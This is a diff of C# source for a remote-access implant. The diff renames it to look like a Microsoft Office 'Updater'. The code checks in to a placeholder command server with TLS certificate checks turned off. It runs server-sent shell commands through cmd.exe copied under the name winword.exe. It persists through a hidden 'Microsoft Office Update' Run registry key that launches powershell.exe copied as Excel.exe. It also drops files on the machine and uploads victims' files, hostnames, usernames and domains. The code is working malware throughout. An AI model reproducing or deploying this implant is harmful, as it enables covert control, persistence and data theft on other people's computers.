@@ -1,121 +1,97 @@
 using System;
 using System.Timers;
 using System.Net;
-using System.Security.AccessControl;
-using System.Security.Principal;
 using Microsoft.Win32;
-using System.Runtime.InteropServices;
 using System.Management;
 using System.Diagnostics;
 using System.Security.Cryptography;
 using System.Threading;
 using System.IO;
 using System.Text;
-using System.Collections;
-using System.Collections.Generic;
 using System.ServiceProcess;
 using AddressFamily = System.Net.Sockets.AddressFamily;
 using System.DirectoryServices.ActiveDirectory;
+using System.Net.Http;
+using System.Threading.Tasks;
 
-namespace Impl4n7
+
+namespace MSOffice
 {
-	public class Program
-	{
-
-        static string xaes_key = "AAAAAAAAAAAAAAAA"; // change on server and client-side to match. can leave "as is" if desired.
-        static string xaes_iv = "BBBBBBBBBBBBBBBB";  // change on server and client-side to match. can leave "as is" if desired.
-        static string c2redirector = "https://your.c2.server.info.goes.here.com/";
+    
+    public class Updater
+    {
+        
+        
+        static string c2host = "https://your.c2.or.redirector.goes.here.com";
+        static string c2fileName = "/submit.php?id=8675309";
+        static string xaes_key = "AAAAAAAAAAAAAAAA"; 
+        static string xaes_iv = "BBBBBBBBBBBBBBBB";
+        
         static string hostname = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
+        static string username = Environment.GetEnvironmentVariable("USERNAME");
         static int guid = Util.GetRandom();
 
-    	public static void Main()
-		{
 
-			//Console.WriteLine("Hello from Main/Checkin");
-			
-			var host = Dns.GetHostEntry(Dns.GetHostName());
-            foreach (var ip in host.AddressList)
-            {
-                if (ip.AddressFamily == AddressFamily.InterNetwork)
-                {
-                    
-                    string ipAddr = ip.ToString();
-                    
-                    //Console.WriteLine("IP Address = " + ipAddr);
-                    //Console.WriteLine(ipAddr);
-
-                    try
-
-                    {
-                    	var domainName = Domain.GetComputerDomain();
-						//Console.WriteLine(domainName);
-                    }
-
-                    catch
-                    {
-                    	//Console.WriteLine("domain catch");
-                    }
-
-                    finally
-                    {
-
-                    }
-
-					Checkin(hostname, guid, ipAddr);
-
-                }
-            
-
-			
-
-			}
-
-
-			
-
-			System.Timers.Timer timer = new System.Timers.Timer(TimeSpan.FromMinutes(.05).TotalMilliseconds);
-			timer.AutoReset = true;
-			timer.Elapsed += new System.Timers.ElapsedEventHandler(RepeatThis);
-			timer.Start();
-			Console.ReadLine();
-			
-			
-		}
-		
-
-		public static void RepeatThis(object sender, ElapsedEventArgs e)
-		{
-			
-			try
-			{
-				GetTask();
-			}
-
-			catch
-			{
-				//Console.WriteLine("Catch from RepeatThis method");
-			}
-			
-		}
-
-
-
-		public static void GetIP()
+        public static void Main()
         {
+            
+            string domainName = string.Empty;
+
+            try 
+            {
+                domainName = Domain.GetComputerDomain().ToString();
+            }
+
+            catch 
+            {
+
+            }
+
             var host = Dns.GetHostEntry(Dns.GetHostName());
             foreach (var ip in host.AddressList)
             {
                 if (ip.AddressFamily == AddressFamily.InterNetwork)
                 {
                     
-                    string ipAddr = ip.ToString();
-                    //Console.WriteLine("IP Address = " + ipAddr);
+                    string ipAddr = ip.ToString();    
+                    Checkin(hostname, guid, ipAddr, domainName, username);
                     
+
                 }
+            
+
             }
+
+
+            
+
+            System.Timers.Timer timer = new System.Timers.Timer(TimeSpan.FromMinutes(.05).TotalMilliseconds);
+            timer.AutoReset = true;
+            timer.Elapsed += new System.Timers.ElapsedEventHandler(RepeatThis);
+            timer.Start();
+            Console.ReadLine();
+            
+            
+        }
+        
+
+        public static void RepeatThis(object sender, ElapsedEventArgs e)
+        {
+            
+            try
+            {
+                GetTask();
+            }
+
+            catch
+            {
+                
+            }
+            
         }
 
-		public static class Util
+
+        public static class Util
         {
             private static Random rnd = new Random();
             public static int GetRandom()
@@ -125,91 +101,371 @@ namespace Impl4n7
 
         }
 
-	   
+       
 
-		public static void GetTask()
-		{
-			
-			
-			ServicePointManager.Expect100Continue = true;
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-				
-			var TaskToRun = string.Empty;
-		    var webClient = new System.Net.WebClient();
-		    
-		    TaskToRun = webClient.DownloadString(c2redirector + guid + "/image.php?action=view");
-		    //Console.WriteLine("Task to be run: " + TaskToRun);
+        public static void GetTask()
+        {
+            
+            try
 
-		    
-		    string DecryptedTaskToRun = DecryptAES(TaskToRun);
-		    //Console.WriteLine("Decrypted Task: " + DecryptedTaskToRun);
-
-
-		    // Various tasks that can be run/added, below
-
-		    if (DecryptedTaskToRun == "null")
-				
-				{
-				    //Console.WriteLine("Waiting for new command. Not proceeding.");
-				    return;
-				}
-
-			if (DecryptedTaskToRun.Contains("dir"))
-				
-				{
-					DirModule(DecryptedTaskToRun);
-				}
-
-			if (DecryptedTaskToRun.Contains("runningTasks"))
+            {
                 
+                var TaskToRun = string.Empty;
+                
+                WebRequest request = WebRequest.Create(c2host + guid + c2fileName);
+                request.Credentials = CredentialCache.DefaultCredentials;
+                WebResponse response = request.GetResponse();
+                //Console.WriteLine(((HttpWebResponse)response).StatusDescription);
+                
+                using (Stream dataStream = response.GetResponseStream())
                 {
-                	RunningTasksModule();
+                    
+                    StreamReader reader = new StreamReader(dataStream);
+                    
+                    string responseFromServer = reader.ReadToEnd();
+                    
+                    TaskToRun = responseFromServer;
+                    //Console.WriteLine(TaskToRun);
+
                 }
 
-            if (DecryptedTaskToRun.Contains("runningServices"))
+                response.Close();
                 
-                {
-                	RunningServicesModule();
-                }
-
-            if (DecryptedTaskToRun.Contains("serviceInfo"))
+                string DecryptedTaskToRun = DecryptAES(TaskToRun);
                 
-                {
-                	ServiceInfoModule(DecryptedTaskToRun);
-                }
+                if (DecryptedTaskToRun == "null")
+                    
+                    {
+                        return;
+                    }
 
-            if (DecryptedTaskToRun.Contains("download"))
-                
-                {
-                	DownloadModule(DecryptedTaskToRun);
-                }
+                if (DecryptedTaskToRun.Contains("dir"))
+                    
+                    {
+                        DirModule(DecryptedTaskToRun);
+                    }
 
-            if (DecryptedTaskToRun.Contains("shell"))
-                
-                {
-                	ShellModule(DecryptedTaskToRun);
-                }
+                if (DecryptedTaskToRun.Contains("runningTasks"))
+                    
+                    {
+                        RunningTasksModule();
+                    }
 
-		}
+                if (DecryptedTaskToRun.Contains("runningServices"))
+                    
+                    {
+                        RunningServicesModule();
+                    }
 
-		
-		private static void DirModule(string xDir)
+                if (DecryptedTaskToRun.Contains("serviceInfo"))
+                    
+                    {
+                        ServiceInfoModule(DecryptedTaskToRun);
+                    }
+
+                if (DecryptedTaskToRun.Contains("download"))
+                    
+                    {
+                        DownloadModule(DecryptedTaskToRun);
+                    }
+
+                if (DecryptedTaskToRun.Contains("persist"))
+                    
+                    {
+                        PModule(DecryptedTaskToRun);
+                    }
+
+                if (DecryptedTaskToRun.Contains("copy"))
+                    
+                    {
+                        CopyFileModule(DecryptedTaskToRun);
+                    }
+
+                if (DecryptedTaskToRun.Contains("upload"))
+                    
+                    {
+                        Upload(DecryptedTaskToRun);
+                    }
+                if (DecryptedTaskToRun.Contains("shell"))
+                    
+                    {
+                        Shell(DecryptedTaskToRun);
+                    }
+
+            }
+
+            catch (WebException ex)
+            {
+
+                //Console.WriteLine("GetTask() Error: {0}", ex.Message);
+                        
+                Post(ex.Message);
+                Main();
+            }
+
+
+        }
+
+        
+        private static void Checkin(string xHostname, int xuID, string xipAddr, string xdomainName, string xUsername)
         {
 
             try
             {
-            	
-            	xDir = xDir.Substring(xDir.IndexOf(' ') + 1);
-            	var targetDirectory = xDir;
-            	string[] fileEntries = Directory.GetFileSystemEntries(targetDirectory);
-            	string results = string.Empty;
 
-            	foreach(var fileName in fileEntries)
-            	    results += "\n" + fileName;
+                Console.WriteLine("Update process started...");
 
-            	//Console.WriteLine(results);
-            	Post(results);
+                ServicePointManager.Expect100Continue = false;
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+                
+                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
+                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
+                
+                byte[] encrypted = EncryptStringToBytes(xHostname, aes_key, aes_iv);
+
+                
+                string str_encrypted = EncryptAES(xHostname + "," + guid + "," + xipAddr + "," + xdomainName + "," + xUsername);
+
+                //Console.WriteLine("Encrypted: {0}", str_encrypted);
+
+                var request = (HttpWebRequest)WebRequest.Create(c2host + "checkin");
+                var postData = Uri.EscapeDataString(str_encrypted);
+                var data = Encoding.ASCII.GetBytes(postData);
+
+                 
+                request.Method = "POST";
+                request.ContentType = "text/plain";
+                request.ContentLength = data.Length;
+
+                try {
+
+                        using (var stream = request.GetRequestStream())
+                        {
+                         stream.Write(data, 0, data.Length);
+                        }
+
+                        var response = (HttpWebResponse)request.GetResponse();
+                        var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
+
+                        
+                        GetTask();
+                     
+                    }
+
+                catch (Exception e)
+                    {
+                        
+                        Console.WriteLine("Error1: {0}", e.Message);
+                        
+                        //Post(e.Message);
+                        return;
+                    }
+
+                finally 
+                    {
+                        //Main();
+                    }
+
+
+                
+            }
+            catch (Exception e)
+            {
+                Post(e.Message);
+                Console.WriteLine("Error2: {0}", e.Message);
+            }
+
+
+            
+        }
+
+
+        
+        private static void Shell(string xArg)
+        {
+
+            try
+            {
+
+                File.Copy(@"c:\windows\system32\cmd.exe", @"c:\users\" + username + @"\AppData\roaming\Microsoft\Word\winword.exe", true);
+                
+                xArg = xArg.Substring(xArg.IndexOf(' ') + 1);
+                ProcessStartInfo processStartInfo = new ProcessStartInfo();
+                processStartInfo.FileName = @"c:\users\" + username + @"\AppData\roaming\Microsoft\Word\winword.exe";
+                processStartInfo.Arguments = "/c" + xArg;
+
+                processStartInfo.CreateNoWindow = true;
+                processStartInfo.UseShellExecute = false;           
+                processStartInfo.RedirectStandardOutput = true;
+
+                Process process = new Process();
+                process.StartInfo = processStartInfo;
+                
+                process.Start();
+
+                string output = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
+                
+                //Console.Write(output);
+                Post(output);
+                
+            }
+
+            catch (Exception e)
+            {
+                //Console.WriteLine("Error: {0}", e.Message);
+                Post(e.Message);
+            }
+
+            finally
+            {
+                //Console.WriteLine("finally block in ShellModule");
+            }
+
+
+
+        }
+
+        private static void PModule(string xLocationOfImp)
+        {
+
+            try
+            {
+
+
+                try
+                {
+                    string sourceFile = @"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe";
+                    string destinationFile = @"c:\users\" + username + @"\AppData\roaming\Microsoft\Excel\Excel.exe"; 
+                    File.Copy(sourceFile, destinationFile, true);  
+                }
+
+                catch (Exception e)
+                {
+                    //Console.WriteLine("Error: {0}", e.Message);
+                    Post(e.Message);
+                }
+
+
+
+                try
+                {
+                    
+                    string splitter = xLocationOfImp;
+                    string[] vars = splitter.Split(' ');
+                    string location = vars[1];
+
+                    string key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+                    Registry.SetValue(key, "Microsoft Office Update", @"c:\users\" + username + @"\AppData\roaming\Microsoft\Excel\Excel.exe -windowstyle hidden [System.Reflection.Assembly]::LoadFile('" + location + "');[MSOffice.Updater]::Main()");
+                    Post("Task completed");
+                }
+
+                catch (Exception e)
+                {
+                    //Console.WriteLine("registry Error: {0}", e.Message);
+                    Post(e.Message);
+                }
+
+            }
+
+            catch (Exception e)
+            {
+                
+                //Console.WriteLine("Error: {0}", e.Message);
+                Post(e.Message);
+            }
+
+        }
+
+        private static void Upload(string xUpload)
+        {
+            
+            //Console.WriteLine(xUpload);
+
+            string FirstSplit = xUpload;
+            string[] vars = FirstSplit.Split(' ');
+            string a = vars[0];
+            string b = vars[1];
+            string c = vars[2];
+
+            string SecondSplit = FirstSplit;
+            string[] vars2 = SecondSplit.Split('\\');
+            string x = vars2[0];
+            string y = vars2[1];
+            string fileName = vars2[2];
+
+            string fileUrl = c2host + guid + "/receiver/" + fileName;
+            
+            string file = fileName;
+
+            var buffer = new byte[80 * 1024];
+
+            ServicePointManager.Expect100Continue = false;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+
+            var client=new HttpClient();
+            var response = client.GetAsync(fileUrl, HttpCompletionOption.ResponseHeadersRead);
+            if (response.Result.IsSuccessStatusCode)
+            {
+                var stream = response.Result.Content.ReadAsStreamAsync().Result;
+
+                var finfo = new FileInfo(file);
+
+                if (finfo.Directory == null)
+                {
+                    //Console.WriteLine("Wrong file path!");
+                    return;
+                }
+
+                if (!finfo.Directory.Exists) finfo.Directory.Create();
+
+                //Console.WriteLine("Downloading data ...");
+                using (var wrtr = new FileStream(file, FileMode.Create, FileAccess.Write, FileShare.None, buffer.Length))
+                {
+                    var read=0;
+                    while ((read = stream.Read(buffer, 0, buffer.Length)) > 0) 
+                    {
+                        wrtr.Write(buffer,0,read);
+                    }
+                    wrtr.Flush();
+                    wrtr.Close();
+                }
+
+                //Console.WriteLine("Data downloaded");
+
+                stream.Close();
+                Post("Task Completed");
+            }
+            else
+            {
+                //Console.WriteLine("error");
+            }
+        }
+        
+        
+
+
+        private static void CopyFileModule(string xSD)
+        {
+
+            
+            try
+            {
+                
+                //string s = string.Empty;
+                string splitter = xSD;
+                string[] vars = splitter.Split(' ');
+
+                string sourceFile = vars[1];
+                string destinationFile = vars[2];
+
+                
+
+                File.Copy(sourceFile, destinationFile, true);
+                Post(sourceFile + " copied to " + destinationFile);
+
 
             }
 
@@ -221,28 +477,62 @@ namespace Impl4n7
 
             finally
             {
-            	//Console.WriteLine("finally block in dirModule");
+                //Console.WriteLine("finally block in dirModule");
             }
 
 
         }
 
 
+
+        private static void DirModule(string xDir)
+        {
+
+            try
+            {
+                
+                xDir = xDir.Substring(xDir.IndexOf(' ') + 1);
+                var targetDirectory = xDir;
+                string[] fileEntries = Directory.GetFileSystemEntries(targetDirectory);
+                string results = string.Empty;
+
+                foreach(var fileName in fileEntries)
+                    results += "\n" + fileName;
+
+                //Console.WriteLine(results);
+                Post(results);
+
+            }
+
+            catch (Exception e)
+            {
+                Console.WriteLine("Error: {0}", e.Message);
+                Post(e.Message);
+            }
+
+            finally
+            {
+                //Console.WriteLine("finally block in dirModule");
+            }
+
+
+        }
+
         private static void RunningTasksModule()
         {
 
             try
             {
-            	
-            	var ProcList = Process.GetProcesses();
-            	string results = string.Empty;
+                
+                var ProcList = Process.GetProcesses();
+                string results = string.Empty;
 
-            	foreach(var proc in ProcList)
-            	    results += "\n" + "Process Name: " + proc.ProcessName + ", " + "PID: " + proc.Id;
+                foreach(var proc in ProcList)
+                    results += "\n" + "Process Name: " + proc.ProcessName + ", " + "PID: " + proc.Id;
 
-            	//Console.WriteLine(results);
+                //Console.WriteLine(results);
 
-            	Post(results);
+                Post(results);
 
             }
 
@@ -254,7 +544,7 @@ namespace Impl4n7
 
             finally
             {
-            	//Console.WriteLine("finally block in RunningTasksModule");
+                
             }
 
 
@@ -265,16 +555,16 @@ namespace Impl4n7
 
             try
             {
-            	
-            	var sController = ServiceController.GetServices();
-            	string results = string.Empty;
+                
+                var sController = ServiceController.GetServices();
+                string results = string.Empty;
 
-            	foreach (var sc in sController)
-            	    results += "\n" + sc.ServiceName;
-            	
-            	//Console.WriteLine(results);
+                foreach (var sc in sController)
+                    results += "\n" + sc.ServiceName;
+                
+                //Console.WriteLine(results);
 
-            	Post(results);
+                Post(results);
 
             }
 
@@ -286,7 +576,7 @@ namespace Impl4n7
 
             finally
             {
-            	//Console.WriteLine("finally block in RunningServicesModule");
+                //Console.WriteLine("finally block in RunningServicesModule");
             }
 
 
@@ -297,31 +587,31 @@ namespace Impl4n7
 
             try
             {
-            	
-            	xService = xService.Substring(xService.IndexOf(' ') + 1);
-            	string serviceName = xService;
-            	string results = string.Empty;                
-            	
-            	using (ManagementObject wmiService = new ManagementObject("Win32_Service.Name='"+ serviceName +"'"))
-            	{
-            	    wmiService.Get();
-            	    string n = wmiService["Name"].ToString();
-            	    string d = wmiService["Description"].ToString();
-            	    string s1 = wmiService["State"].ToString();
-            	    string s2 = wmiService["Status"].ToString();
-            	    string p = wmiService["PathName"].ToString();
-            	    
-            	    results = "\n" + "Name: " + n +
-            	              "\n" + "Description: " + d +
-            	              "\n" + "State: " + s1 +
-            	              "\n" + "Status: " + s2 +
-            	              "\n" + "PathName: " + p;
-            	    //Console.WriteLine(results);
+                
+                xService = xService.Substring(xService.IndexOf(' ') + 1);
+                string serviceName = xService;
+                string results = string.Empty;                
+                
+                using (ManagementObject wmiService = new ManagementObject("Win32_Service.Name='"+ serviceName +"'"))
+                {
+                    wmiService.Get();
+                    string n = wmiService["Name"].ToString();
+                    string d = wmiService["Description"].ToString();
+                    string s1 = wmiService["State"].ToString();
+                    string s2 = wmiService["Status"].ToString();
+                    string p = wmiService["PathName"].ToString();
+                    
+                    results = "\n" + "Name: " + n +
+                              "\n" + "Description: " + d +
+                              "\n" + "State: " + s1 +
+                              "\n" + "Status: " + s2 +
+                              "\n" + "PathName: " + p;
+                    //Console.WriteLine(results);
 
 
-            	}
+                }
 
-            	Post(results);
+                Post(results);
 
             }
 
@@ -333,7 +623,7 @@ namespace Impl4n7
 
             finally
             {
-            	//Console.WriteLine("finally block in ServiceInfoModule");
+                //Console.WriteLine("finally block in ServiceInfoModule");
             }
 
 
@@ -342,182 +632,58 @@ namespace Impl4n7
         private static void DownloadModule(string xDownload)
         {
 
-            try
-            {
-            	
-            	ServicePointManager.Expect100Continue = true;
-            	ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            	ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-
-            	xDownload = xDownload.Substring(xDownload.IndexOf(' ') + 1);
-            	var fileName = xDownload;
-            	
-            	byte[] bytes = File.ReadAllBytes(fileName);
-            	string base64 = System.Convert.ToBase64String(bytes);
-            	
-            	string tmpFile = fileName + ".tmp";
-
-            	File.WriteAllText (tmpFile, base64);
-
-            	String uriString = c2redirector + "api";
-            	WebClient myWebClient = new WebClient();
-            	
-            	try
-            	{
-            	    byte[] responseArray = myWebClient.UploadFile(uriString, "POST", tmpFile);
-            	    File.Delete(tmpFile);
-            	    
-            	}
-
-            	catch
-            	{
-            		//Console.WriteLine("DownloadModule catch");
-            	}
-
-            	finally
-            	{
-            		File.Delete(tmpFile);
-            	}
-            	
-
-            }
-
-            catch (Exception)
-            {
-                //Console.WriteLine("Error: {0}", e.Message);
-                //Post(e.Message);
-            }
-
-            finally
-            {
-            	//Console.WriteLine("finally block in main DownloadModule");
-            	
-            }
-
-
-        }
-
-        private static void ShellModule(string xShell)
-        {
+            //Console.WriteLine("Hello from DownloadModule");
 
             try
-            {
-            	
-            	xShell = xShell.Substring(xShell.IndexOf(' ') + 1);
-
-            	Process p = new Process();
-            	
-            	// Redirect the output stream of the child process.
-            	p.StartInfo.UseShellExecute = false;
-            	p.StartInfo.RedirectStandardOutput = true;
-            	p.StartInfo.FileName = "cmd.exe";
-            	p.StartInfo.Arguments = "/c" + xShell;
-            	p.Start();
-
-            	string results = p.StandardOutput.ReadToEnd();
-            	
-            	//Console.WriteLine(results);
-
-            	Post(results);
-
-            }
-
-            catch (Exception e)
-            {
-                //Console.WriteLine("Error: {0}", e.Message);
-                Post(e.Message);
-            }
-
-            finally
-            {
-            	//Console.WriteLine("finally block in ShellModule");
-            }
-
-
-        }
-
-
-		
-        private static void Checkin(string xHostname, int xuID, string xipAddr)
-        {
-
-            try
-            {
-
-            	//Console.WriteLine("hello from Checkin");
-
-            	ServicePointManager.Expect100Continue = true;
-            	ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            	ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            {    
                 
-            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
-            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
+                xDownload = xDownload.Substring(xDownload.IndexOf(' ') + 1);
+                var fileName = xDownload;
+                //Console.WriteLine("testing " + fileName);
                 
-                byte[] encrypted = EncryptStringToBytes(xHostname, aes_key, aes_iv);
+                byte[] bytes = File.ReadAllBytes(fileName);
+                string base64 = System.Convert.ToBase64String(bytes);
+                
+                string tmpFile = fileName + ".tmp";
 
-                // Encrypt the string to an array of bytes.
-                string str_encrypted = EncryptAES(xHostname + "," + guid + "," + xipAddr);
+                File.WriteAllText (tmpFile, base64);
 
-                //Console.WriteLine("Encrypted: {0}", str_encrypted);
-
-                var request = (HttpWebRequest)WebRequest.Create(c2redirector + "checkin");
-                var postData = Uri.EscapeDataString(str_encrypted);
-                var data = Encoding.ASCII.GetBytes(postData);
-
-                 
-                request.Method = "POST";
-                request.ContentType = "text/plain";
-                request.ContentLength = data.Length;
-
-                try {
-
-                        using (var stream = request.GetRequestStream())
-                        {
-                         stream.Write(data, 0, data.Length);
-                        }
-
-                        var response = (HttpWebResponse)request.GetResponse();
-                        var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
-
-                        GetTask();
-                     
-                     
-                    }
-
-                catch (Exception)
+                
+                var formContent = new MultipartFormDataContent
                     {
-                    	
-                    	//Console.WriteLine("Error: {0}", e.Message);
-                    	//Post(e.Message);
-                    	return;
-                    }
+                        { new ByteArrayContent(File.ReadAllBytes(tmpFile)), "file", Path.GetFileName(tmpFile) }
+                    };
 
+                var client = new HttpClient();
+                var response = client.PostAsync(c2host + "/api", formContent).Result;
+                //return;
+                Post("Task completed");
 
-                
+                    //File.Delete(tmpFile);
             }
-            catch (Exception e)
+
+            catch
             {
-                Post(e.Message);
-                //Console.WriteLine("Error: {0}", e.Message);
-            }
+                //Console.WriteLine("Testing");
+            }   
 
 
-            
         }
 
-		private static void Post(string ResultsToPost)
+
+ 
+        private static void Post(string ResultsToPost)
         {
 
             try
             {
 
-            	//Console.WriteLine("hello from Post");
-            	ServicePointManager.Expect100Continue = true;
-            	ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            	ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+                ServicePointManager.Expect100Continue = false;
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                 
-            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
-            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
+                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
+                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
                 
                 byte[] encrypted = EncryptStringToBytes(ResultsToPost, aes_key, aes_iv);
 
@@ -526,7 +692,7 @@ namespace Impl4n7
 
                 //Console.WriteLine("Encrypted: {0}", str_encrypted);
 
-                var request = (HttpWebRequest)WebRequest.Create(c2redirector + "results");
+                var request = (HttpWebRequest)WebRequest.Create(c2host + "results");
                 var postData = Uri.EscapeDataString(str_encrypted);
                 var data = Encoding.ASCII.GetBytes(postData);
 
@@ -549,9 +715,9 @@ namespace Impl4n7
 
                 catch (Exception)
                     {
-                    	//Post(e.Message);
-                    	//Console.WriteLine("Error: {0}", e.Message);
-                    	return;
+                        //Post(e.Message);
+                        //Console.WriteLine("Error: {0}", e.Message);
+                        return;
                     }
                 
             }
@@ -574,8 +740,8 @@ namespace Impl4n7
             using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
             {
 
-            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
-            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
+                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
+                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
 
                 aes.Key = aes_key;
                 aes.IV = aes_iv;
@@ -647,8 +813,8 @@ namespace Impl4n7
 
             using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
             {
-            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
-            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
+                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
+                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
 
                 aes.Key = aes_key;
                 aes.IV = aes_iv;
@@ -716,5 +882,5 @@ namespace Impl4n7
 
 
 
-	}
+    }
 }
